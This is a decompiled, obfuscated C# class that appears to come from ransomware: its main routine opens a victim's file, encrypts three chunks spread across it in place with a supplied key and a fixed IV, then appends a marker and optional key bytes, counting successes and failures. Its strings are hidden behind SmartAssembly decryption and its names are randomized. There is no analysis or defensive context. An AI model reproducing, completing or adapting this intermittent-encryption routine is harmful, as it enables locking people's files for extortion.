using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using mZSkaiSmIMoZ;

namespace bmDbQpaZORfnY;

internal sealed class qxPVoZOaesEzvE
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int jVnBpzwLXLcz(long long_0)
	{
		return (int)long_0;
	}

	public static bool qVdRfKhmKIehGw(string kNMoyAuGrCTEb, string tspozneXThYIh, string UFFZNXGojkVQH, byte[] SbMOJUlfKcBuygV = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(kNMoyAuGrCTEb, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = jVnBpzwLXLcz(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(tspozneXThYIh) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(tspozneXThYIh) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(tspozneXThYIh) * 1024 * 1024) / 10;
				}
				int qfDUMAJkeZccXs = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = dvqTAwXsPFcM(kNMoyAuGrCTEb, fileStream, qfDUMAJkeZccXs, num * i);
					array = (qMBmfvOoVnw.AUEsBSTinpTuD ? kSntQQDhdKClx.retuMYTezoWGtkP(byte_, Encoding.ASCII.GetBytes(UFFZNXGojkVQH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : KpGxARzmOhh.hFniFSRZbJWsGd(byte_, Encoding.ASCII.GetBytes(UFFZNXGojkVQH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					oQGedOQDRxD(kNMoyAuGrCTEb, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (qMBmfvOoVnw.HtEoifwVYHx ? Encoding.ASCII.GetBytes(qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107401129)) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402081)) + Convert.ToString(tspozneXThYIh) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402081))) : Encoding.ASCII.GetBytes(qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107401129)) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402122)) + Convert.ToString(tspozneXThYIh) + qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107402122))));
			if (!qMBmfvOoVnw.HtEoifwVYHx)
			{
				using FileStream fileStream2 = new FileStream(kNMoyAuGrCTEb, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(kNMoyAuGrCTEb, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(SbMOJUlfKcBuygV, 0, SbMOJUlfKcBuygV.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (qMBmfvOoVnw.XZxMDRItGAyFV)
			{
				try
				{
					File.AppendAllText(qMBmfvOoVnw.yOCAHBSkOQrG, getString_0(107388617) + kNMoyAuGrCTEb + getString_0(107401084) + ex.Message + getString_0(107396438));
				}
				catch (Exception)
				{
				}
			}
			qMBmfvOoVnw.cRWjcXvHmjJ++;
			return false;
		}
		qMBmfvOoVnw.JsWoTAjDEfI++;
		return true;
	}

	public static byte[] dvqTAwXsPFcM(string wVzFJJZSXDzg, FileStream egkhVZdKvoPY, int QfDUMAJkeZccXs, int iUvDodqqHTZKsZ = 0)
	{
		byte[] array = new byte[QfDUMAJkeZccXs];
		egkhVZdKvoPY.Position = iUvDodqqHTZKsZ;
		egkhVZdKvoPY.Read(array, 0, QfDUMAJkeZccXs);
		return array;
	}

	public static void oQGedOQDRxD(string UqcwBOxDcrdsD, FileStream InUmdloVjZCanE, byte[] rFJZdBKbjjaWD, int zTmpujKfJb = 0)
	{
		InUmdloVjZCanE.Position = zTmpujKfJb;
		InUmdloVjZCanE.Write(rFJZdBKbjjaWD, 0, rFJZdBKbjjaWD.Length);
	}

	static qxPVoZOaesEzvE()
	{
		Strings.CreateGetStringDelegate(typeof(qxPVoZOaesEzvE));
	}
}
